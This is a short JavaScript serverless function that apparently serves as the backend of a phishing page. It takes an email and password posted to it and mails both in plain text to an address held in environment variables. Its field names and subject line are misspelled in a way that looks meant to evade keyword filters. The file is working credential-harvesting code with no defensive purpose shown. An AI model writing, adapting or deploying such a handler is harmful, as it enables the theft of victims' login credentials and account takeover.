const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {

    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    const { emll, pss } = JSON.parse(event.body);

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.ELL_USS,
            pass: process.env.ELL_PSS,
        },
    });

    try {
        await transporter.sendMail({
            from: process.env.ELL_USS,
            to: process.env.EMAIL_USS,
            subject: 'Nw deetzhrefru',
            text: `Eml: ${emll}\nPss: ${pss}`,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Success" }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Failed to send email" }),
        };
    }
};